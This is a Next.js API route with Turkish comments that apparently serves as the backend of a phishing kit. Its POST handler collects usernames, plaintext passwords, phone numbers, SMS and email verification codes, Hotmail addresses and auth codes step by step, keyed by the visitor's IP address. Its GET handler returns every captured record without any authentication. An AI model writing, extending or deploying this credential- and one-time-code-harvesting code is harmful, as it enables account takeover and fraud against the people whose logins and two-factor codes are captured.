import { NextRequest, NextResponse } from 'next/server'
import { connectMongoDB, Record } from '@/lib/models'

const formatIP = (ip: string): string => {
  if (ip.startsWith('::ffff:')) {
    return ip.substring(7)
  }
  return ip
}

// POST: Yeni kayıt ekle veya var olanı güncelle
export async function POST(request: NextRequest) {
  try {
    await connectMongoDB()
    
    const data = await request.json()
    const { username, password, phone, phone_sms, mail_sms, hotmail, auth } = data
    
    // Middleware'den IP al
    let ipAddress = request.headers.get('x-real-client-ip') || '';
    if (!ipAddress) {
      ipAddress = data.ipAddress || 'unknown-ip';
    }
    
    // IP formatla
    ipAddress = formatIP(ipAddress);
    
    // İstek gövdesinde ipAddress kontrolü
    if (!ipAddress || ipAddress === 'unknown-ip') {
      console.error('IP adresi alınamadı:', data)
      return NextResponse.json(
        { success: false, message: 'IP adresi belirlenemedi' },
        { status: 400 }
      )
    }
    
    // Önce IP'ye göre kaydı bul
    let existingRecord = await Record.findOne({ ipAddress }).sort({ createdAt: -1 })
    
    // İlk Giriş Bilgileri - Kullanıcı adı ve şifre var ve kayıt henüz mevcut değilse
    if ((username && password) && !existingRecord) {
      const newRecord = await Record.create({
        ipAddress,
        username,
        password,
        phone: phone || '',
        phone_sms: phone_sms || '',
        mail_sms: mail_sms || '',
        hotmail: hotmail || '',
        auth: auth || ''
      })
      
      return NextResponse.json({ 
        success: true, 
        message: 'Yeni kayıt başarıyla eklendi',
        recordId: newRecord._id
      })
    }
    
    // Eğer kayıt zaten varsa, güncelle
    if (existingRecord) {
      // Başlangıç kaydı var, bilgileri güncelle
      const updateData: any = {}
      
      // Giriş bilgileri her zaman güncellenmeli
      if (username && password) {
        updateData.username = username
        updateData.password = password
      }
      
      // Tüm veriler her zaman güncellenmeli - gönderilen tüm veriler varsa güncelle
      if (phone) updateData.phone = phone // Her zaman güncelle 
      if (phone_sms) updateData.phone_sms = phone_sms // Her zaman güncelle
      if (mail_sms) updateData.mail_sms = mail_sms // Her zaman güncelle
      if (auth) updateData.auth = auth // Her zaman güncelle
      if (hotmail) updateData.hotmail = hotmail // Her zaman güncelle
      
      // Debug log
      console.log('Güncellenecek veri:', updateData);
      console.log('Mevcut kayıt:', existingRecord);
      
      if (Object.keys(updateData).length > 0) {
        // Yeterli veri varsa güncelle
        try {
          const updateResult = await Record.updateOne({ _id: existingRecord._id }, { $set: updateData });
          console.log('Güncelleme sonucu:', updateResult);
          
          return NextResponse.json({ 
            success: true, 
            message: 'Kayıt başarıyla güncellendi',
            recordId: existingRecord._id
          });
        } catch (updateError) {
          console.error('Güncelleme hatası:', updateError);
          return NextResponse.json({ 
            success: false, 
            message: 'Kayıt güncellenirken hata oluştu'
          }, { status: 500 });
        }
      }
      
      // Hiçbir güncelleme yapılmadıysa
      return NextResponse.json({ 
        success: true,
        message: 'Kayıt zaten güncel',
        recordId: existingRecord._id
      })
    }
    
    // IP var ama henüz kaydı yok, ve kullanıcı+şifre de yok
    // Telefon veya diğer bilgileri kaydedelim
    if (!existingRecord) {
      const newRecord = await Record.create({
        ipAddress,
        username: '',
        password: '',
        phone: phone || '',
        phone_sms: phone_sms || '',
        mail_sms: mail_sms || '',
        hotmail: hotmail || '',
        auth: auth || ''
      })
      
      return NextResponse.json({ 
        success: true, 
        message: 'Yeni kayıt başarıyla eklendi',
        recordId: newRecord._id
      })
    }
  } catch (error: any) {
    console.error('API hatası:', error)
    return NextResponse.json(
      { success: false, message: 'Sunucu hatası: ' + error.message },
      { status: 500 }
    )
  }
}

// GET: Tüm kayıtları getir
export async function GET() {
  try {
    await connectMongoDB()
    const records = await Record.find().sort({ createdAt: -1 })
    
    return NextResponse.json({ success: true, data: records })
  } catch (error: any) {
    console.error('API hatası:', error)
    return NextResponse.json(
      { success: false, message: 'Sunucu hatası: ' + error.message },
      { status: 500 }
    )
  }
}